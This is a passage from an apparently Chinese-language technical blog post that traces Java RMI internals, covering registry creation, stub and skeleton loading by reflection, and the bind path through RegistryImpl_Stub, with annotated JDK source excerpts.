<span class="variable">lref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, port);</span><br><span class="line">                    <span class="comment">// 设置 UnicastServerRef，并指定 registryFilter 作为过滤器</span></span><br><span class="line">                    setup(<span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(lref, RegistryImpl::registryFilter));</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;, <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">SocketPermission</span>(<span class="string">&quot;localhost:&quot;</span>+port, <span class="string">&quot;listen,accept&quot;</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (PrivilegedActionException pae) &#123;</span><br><span class="line">            <span class="comment">// 如果发生异常，抛出 RemoteException</span></span><br><span class="line">            <span class="keyword">throw</span> (RemoteException)pae.getException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 非默认端口，直接创建 LiveRef 和 UnicastServerRef 实例</span></span><br><span class="line">        <span class="type">LiveRef</span> <span class="variable">lref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, port);</span><br><span class="line">        setup(<span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(lref, RegistryImpl::registryFilter));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>setup</code> 方法中，依旧是使用 <code>UnicastServerRef</code> 的 <code>exportObject</code> 方法导出对象，只不过这次 <code>export</code> 的是 <code>RegistryImpl</code> 这个对象（之前是远程对象的动态代理对象 <code>UnicastRemoteObject</code>）。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 使用参数 &lt;code&gt;uref&lt;/code&gt; 创建并导出远程对象。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">setup</span><span class="params">(UnicastServerRef uref)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="comment">/* 必须在导出远程对象 &#x27;this&#x27; 之前创建并分配服务器引用。 */</span></span><br><span class="line">    ref = uref;  <span class="comment">// 将传入的 UnicastServerRef 对象赋值给 ref</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用 UnicastServerRef 的 exportObject 方法导出当前远程对象</span></span><br><span class="line">    uref.exportObject(<span class="built_in">this</span>, <span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>exportObject</code> 函数调用 <code>createProxy</code> 创建代理类时，由于 <code>stubClassExists</code> 函数检测到要导出的 <code>RegistryImpl</code> 对应的存根类 <code>un.rmi.registry.RegistryImpl_Stub</code>，因此会调用 <code>createStub</code> 函数来获取 <code>RegistryImpl</code> 的存根而不是创建 <code>RegistryImpl</code> 的动态代理类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 如果可以加载给定实现类的存根类（stub class），则返回 true，</span></span><br><span class="line"><span class="comment"> * 否则返回 false。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> remoteClass 需要获取远程接口的类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">stubClassExists</span><span class="params">(Class&lt;?&gt; remoteClass)</span> &#123;</span><br><span class="line">    <span class="comment">// 如果 &quot;withoutStubs&quot; 表中没有该类，则进行检查</span></span><br><span class="line">    <span class="keyword">if</span> (!withoutStubs.containsKey(remoteClass)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 尝试加载带有 &quot;_Stub&quot; 后缀的存根类</span></span><br><span class="line">            Class.forName(remoteClass.getName() + <span class="string">&quot;_Stub&quot;</span>,</span><br><span class="line">                          <span class="literal">false</span>,  <span class="comment">// 不初始化类</span></span><br><span class="line">                          remoteClass.getClassLoader());  <span class="comment">// 使用该类的类加载器加载</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;  <span class="comment">// 如果加载成功，返回 true</span></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException cnfe) &#123;</span><br><span class="line">            <span class="comment">// 如果找不到存根类，则将该类标记为没有存根类</span></span><br><span class="line">            withoutStubs.put(remoteClass, <span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;  <span class="comment">// 如果找不到存根类，返回 false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title function_">createProxy</span><span class="params">(Class&lt;?&gt; implClass,</span></span><br><span class="line"><span class="params">                                 RemoteRef clientRef,</span></span><br><span class="line"><span class="params">                                 <span class="type">boolean</span> forceStubUse)</span></span><br><span class="line">    <span class="keyword">throws</span> StubNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (forceStubUse ||</span><br><span class="line">        !(ignoreStubClasses || !stubClassExists(remoteClass)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> createStub(remoteClass, clientRef);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>createStub</code> 函数通过反射将 <code>RegistryImpl_Stub</code> 类加载并实例化。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 为指定的类创建一个 RemoteStub 实例，并使用指定的 RemoteRef 构造。</span></span><br><span class="line"><span class="comment"> * 提供的类必须是远程对象超类链中最派生的类，并且实现了远程接口。</span></span><br><span class="line"><span class="comment"> * 存根类的名称是指定的 remoteClass 名称加上后缀 &quot;_Stub&quot;。</span></span><br><span class="line"><span class="comment"> * 存根类的加载从指定类的类加载器开始（可能是引导类加载器）。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> RemoteStub <span class="title function_">createStub</span><span class="params">(Class&lt;?&gt; remoteClass, RemoteRef ref)</span></span><br><span class="line">        <span class="keyword">throws</span> StubNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">stubname</span> <span class="operator">=</span> remoteClass.getName() + <span class="string">&quot;_Stub&quot;</span>;  <span class="comment">// 存根类的名称由远程类名加上 &quot;_Stub&quot; 后缀</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 确保使用本地存根加载器加载存根类。</span></span><br><span class="line"><span class="comment">     * 当通过本地加载器加载时，加载路径可以通过 MarshalOutputStream/InStream</span></span><br><span class="line"><span class="comment">     * 的 pickle 方法传递给远程客户端。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 使用指定类的类加载器加载存根类</span></span><br><span class="line">        Class&lt;?&gt; stubcl =</span><br><span class="line">            Class.forName(stubname, <span class="literal">false</span>, remoteClass.getClassLoader());</span><br><span class="line">        <span class="comment">// 获取存根类的构造方法</span></span><br><span class="line">        Constructor&lt;?&gt; cons = stubcl.getConstructor(stubConsParamTypes);</span><br><span class="line">        <span class="comment">// 创建存根类的实例并返回</span></span><br><span class="line">        <span class="keyword">return</span> (RemoteStub) cons.newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; ref &#125;);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>之后回到 <code>exportObject</code>，由于这时候是实例化的 <code>RemoteStub</code> 而不是创建远程对象的动态代理，因此会调用 <code>setSkeleton</code> 设置骨架。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果存根是 RemoteStub 的实例，设置骨架（Skeleton）</span></span><br><span class="line"><span class="keyword">if</span> (stub <span class="keyword">instanceof</span> RemoteStub) &#123;</span><br><span class="line">    setSkeleton(impl);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>setSkeleton</code> 会调用 <code>Util.createSkeleton</code> 创建注册中心 <code>RegistryImpl</code> 的骨架类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 定位并返回指定远程对象的 Skeleton（骨架类）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> object 远程对象实例</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 对应的 Skeleton 实例</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> SkeletonNotFoundException 如果找不到或加载骨架类失败</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> Skeleton <span class="title function_">createSkeleton</span><span class="params">(Remote object)</span></span><br><span class="line">        <span class="keyword">throws</span> SkeletonNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    Class&lt;?&gt; cl;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 获取实现远程接口的类（通常是最派生的实现类）</span></span><br><span class="line">        cl = getRemoteClass(object.getClass());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">        <span class="comment">// [...];</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据类名构造骨架类名，后缀为 &quot;_Skel&quot;</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">skelname</span> <span class="operator">=</span> cl.getName() + <span class="string">&quot;_Skel&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 使用对象类的类加载器尝试加载骨架类</span></span><br><span class="line">        Class&lt;?&gt; skelcl = Class.forName(skelname, <span class="literal">false</span>, cl.getClassLoader());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实例化骨架类并返回</span></span><br><span class="line">        <span class="keyword">return</span> (Skeleton) skelcl.newInstance();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 查找并为指定的实现对象设置对应的 Skeleton（骨架）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> impl 远程对象的实现实例</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> RemoteException 如果设置过程中发生远程异常</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSkeleton</span><span class="params">(Remote impl)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="comment">// 如果该类未被记录为“没有骨架”，则尝试加载骨架类</span></span><br><span class="line">    <span class="keyword">if</span> (!withoutSkeletons.containsKey(impl.getClass())) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 尝试创建并设置骨架实例</span></span><br><span class="line">            skel = Util.createSkeleton(impl);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SkeletonNotFoundException e) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * 忽略骨架类找不到的异常，因为从 JDK 1.2 开始，骨架类已不再是必须的（动态代理取代了它）。</span></span><br><span class="line"><span class="comment">             * 将此类记录为“无骨架类”，以避免重复尝试加载。</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            withoutSkeletons.put(impl.getClass(), <span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>createSkeleton</code> 会根据传入的存根对象的类 <code>RegistryImpl_Stub</code> 找到对应的远程对象的类 <code>RegistryImpl</code>，然后通过名称拼接得到对应的骨架对象 <code>sun.rmi.registry.RegistryImpl_Skel</code> 并使用反射将其加载并实例化。</p>
<p>之后依旧是：</p>
<ol>
<li>封装 <code>target</code> 对象，将 <code>ResgitryImpl</code> 和 <code>RegistryImpl_Stub</code> 封装成 <code>Target</code>。</li>
<li><code>LiveRef#exportObject</code> 将 <code>target</code> 导出，开启监听端口。</li>
<li><code>putTarget</code> 将 <code>target</code> 放入 <code>objTable</code> 和 <code>implTable</code> 。</li>
</ol>
<p>完成远程对象创建和注册中心创建后，<code>objTable</code> 会有三个值：</p>
<ul>
<li><code>DGC</code> 垃圾回收：<code>stub</code> 为 <code>DGCImpl_Stub</code>，<code>skel</code> 为 <code>DGCImpl_Skel</code>。</li>
<li>创建的远程对象：<code>stub</code> 为远程对象的代理对象，<code>skel</code> 为  <code>null</code>。</li>
<li>注册中心：<code>stub</code> 为 <code>RegistryImpl_Stub</code>，<code>skel</code> 为 <code>RegistryImpl_Skel</code>。</li>
</ul>
<p>由上可知注册中心就是一个特殊的远程对象，和普通远程对象创建的差异：</p>
<ul>
<li><code>LiveRef</code> 的 <code>id</code> 为 0。</li>
<li>远程对象 <code>Stub</code> 为动态代理，注册中心的 <code>Stub</code> 为 <code>RegistryImpl_Stub</code>，同时还创建了<code>RegistryImpl_Skel</code>。</li>
<li>远程对象端口默认随机，注册中心端口默认 1099。</li>
</ul>
<p>总结一下注册中心创建的一些关键点：</p>
<ul>
<li><code>LocateRegistry#createRegistry</code> 用于创建注册中心 <code>RegistryImpl</code>。</li>
<li>注册中心是一个特殊的远程对象，对象 id 为 0。</li>
<li>导出时不会创建动态代理，而是找到 <code>RegistryImpl_Stub</code>，同时创建了对应的骨架 <code>RegistryImpl_Skel</code>，Stub 会被序列化传递给客户端，其重写了 <code>Registry</code> 的<code>lookup</code>、<code>bind</code> 等方法，会对传输和接收的数据流进行序列化和反序列化。</li>
<li>后面的 socket 端口监听、target 存储到 <code>objTables</code> 和远程对象的导出一致。</li>
</ul>
<h4 id="远程对象注册"><a href="#远程对象注册" class="headerlink" title="远程对象注册"></a>远程对象注册</h4><p>首先是直接使用 <code>RegistryImpl</code>（实际上 <code>LocateRegistry.createRegistry</code> 返回的是 <code>RegistryImpl_Stub</code>）的 <code>bind</code> 方法注册的方式：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"><span class="type">RemoteHello</span> <span class="variable">hello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteHello</span>();</span><br><span class="line">registry.bind(<span class="string">&quot;hello&quot;</span>, hello);</span><br></pre></td></tr></table></figure></div>

<p>这里的 <code>bind</code> 方法实际上就是把 <code>name</code> 和 <code>obj</code> 放到 <code>bindings</code> 这个哈希表中。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将指定的远程对象与名称绑定。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> name 要绑定的名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> obj  要绑定的远程对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> RemoteException 如果远程操作失败</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> AlreadyBoundException 如果名称已经被绑定</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> AccessException 如果没有访问权限</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">bind</span><span class="params">(String name, Remote obj)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException, AlreadyBoundException, AccessException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 骨架中的访问检查会防止远程访问，但对本地访问不适用。</span></span><br><span class="line">    <span class="keyword">synchronized</span> (bindings) &#123;</span><br><span class="line">        <span class="comment">// 检查指定名称是否已经绑定了远程对象</span></span><br><span class="line">        <span class="type">Remote</span> <span class="variable">curr</span> <span class="operator">=</span> bindings.get(name);</span><br><span class="line">        <span class="keyword">if</span> (curr != <span class="literal">null</span>)</span><br><span class="line">            <span class="comment">// 如果名称已经被绑定，抛出 AlreadyBoundException</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AlreadyBoundException</span>(name);</span><br><span class="line">        <span class="comment">// 如果名称未被绑定，将远程对象与名称绑定</span></span><br><span class="line">        bindings.put(name, obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果是使用 <code>Naming#bind</code> 静态方法，则会先调用 <code>getRegistry</code> 获取 RMI URL 对应的注册中心存根 <code>RegistryImpl_Stub</code>，之后和前面的方法一样调用的是 <code>RegistryImpl_Stub</code> 的 <code>bind</code> 方法完成远程对象的注册。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将指定的 &lt;code&gt;name&lt;/code&gt; 绑定到远程对象。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> name 使用 URL 格式的名称（不包括协议部分）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> obj 远程对象的引用（通常是存根）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@exception</span> AlreadyBoundException 如果名称已经被绑定</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@exception</span> MalformedURLException 如果名称格式不正确</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@exception</span> RemoteException 如果无法联系到注册中心</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@exception</span> AccessException 如果不允许执行此操作（例如，来自非本地主机的请求）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> JDK1.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">bind</span><span class="params">(String name, Remote obj)</span></span><br><span class="line">        <span class="keyword">throws</span> AlreadyBoundException,</span><br><span class="line">               java.net.MalformedURLException,</span><br><span class="line">               RemoteException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 解析给定的名称，生成解析后的 URL 对象</span></span><br><span class="line">    <span class="type">ParsedNamingURL</span> <span class="variable">parsed</span> <span class="operator">=</span> parseURL(name);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 获取相应的注册中心对象</span></span><br><span class="line">    <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> getRegistry(parsed);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果远程对象是 null，抛出空指针异常</span></span><br><span class="line">    <span class="keyword">if</span> (obj == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>(<span class="string">&quot;cannot bind to null&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将远程对象与解析后的名称绑定</span></span><br><span class="line">    registry.bind(parsed.name, obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>RegistryImpl_Stub#bind</code> 函数实现如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bind(String, Remote) 方法的实现</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">bind</span><span class="params">(java.lang.String $param_String_1, java.rmi.Remote $param_Remote_2)</span></span><br><span class="line">        <span class="keyword">throws</span> java.rmi.AccessException, java.rmi.AlreadyBoundException, java.rmi.RemoteException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 创建一个远程调用对象</span></span><br><span class="line">        <span class="type">StreamRemoteCall</span> <span class="variable">call</span> <span class="operator">=</span> (StreamRemoteCall) ref.newCall(<span class="built_in">this</span>, operations, <span class="number">0</span>, interfaceHash);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取输出流并将参数序列化到流中</span></span><br><span class="line">            java.io.<span class="type">ObjectOutput</span> <span class="variable">out</span> <span class="operator">=</span> call.getOutputStream();</span><br><span class="line">            out.writeObject($param_String_1);  <span class="comment">// 写入名称参数</span></span><br><span class="line">            out.writeObject($param_Remote_2);  <span class="comment">// 写入远程对象参数</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">            <span class="comment">// 如果序列化参数时出错，抛出 MarshalException</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.MarshalException(<span class="string">&quot;error marshalling arguments&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 调用远程方法</span></span><br><span class="line">        ref.invoke(call);</span><br><span class="line">        <span class="comment">// 完成远程调用</span></span><br><span class="line">        ref.done(call);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (java.lang.RuntimeException e) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>该函数首先调用 <code>ref.newCall</code> 建立与远程注册中心的连接从而创建一个远程调用对象。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 为该对象创建一个适当的调用对象，以便进行新的调用。</span></span><br><span class="line"><span class="comment"> * 传入操作数组和操作索引，允许存根生成器分配操作索引并进行解释。</span></span><br><span class="line"><span class="comment"> * RemoteRef 可能需要操作来为调用进行编码。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> RemoteCall <span class="title function_">newCall</span><span class="params">(RemoteObject obj, Operation[] ops, <span class="type">int</span> opnum,</span></span><br><span class="line"><span class="params">                          <span class="type">long</span> hash)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException</span><br><span class="line">&#123;</span><br><span class="line">    clientRefLog.log(Log.BRIEF, <span class="string">&quot;get connection&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取连接通道并创建连接</span></span><br><span class="line">    <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> ref.getChannel().newConnection();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        clientRefLog.log(Log.VERBOSE, <span class="string">&quot;create call context&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 记录有关传出调用的信息 */</span></span><br><span class="line">        <span class="keyword">if</span> 